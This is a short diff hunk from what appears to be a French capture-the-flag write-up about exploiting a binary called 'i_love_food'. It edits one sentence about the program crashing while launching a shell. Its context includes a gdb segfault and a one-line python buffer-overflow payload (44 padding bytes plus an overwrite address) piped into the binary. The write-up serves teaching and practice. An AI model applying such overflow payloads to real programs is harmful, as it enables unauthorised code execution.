@@ -140,7 +140,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000000000000000 in ?? ()
 ```
 
-On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur le binaire :
+On arrive bien au message de succès. Testons le payload directement sur l'executable :
 
 ```console
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee) | ./i_love_food  
